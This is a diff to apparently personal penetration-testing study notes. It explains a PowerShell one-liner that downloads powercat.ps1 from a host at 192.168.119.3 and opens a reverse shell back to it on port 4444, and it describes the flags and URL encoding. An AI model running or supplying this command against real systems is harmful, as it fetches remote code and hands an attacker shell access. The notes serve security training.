@@ -522,6 +522,12 @@ If the result is 'PowerShell'  we can try to obtain system access (reverse shell
 # the reverse shell command
 IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
 ~~~
+The function above, is constructed in to parts, separated by a semi-colon.  The first part, is a download cradle to load the PowerCat function contained in the script, and the section part uses the PowerCat function to create the reverse shell with the following parameters:
+*  -c to specify where to connect;
+*  -p for the port; and
+*  -e for executing the program.
+URL encoding is required.
+The python http server should show the 'GET' request and the reverse shell should be available in the other terminal.
 ## Tags
 #enumeration
 #nmap 
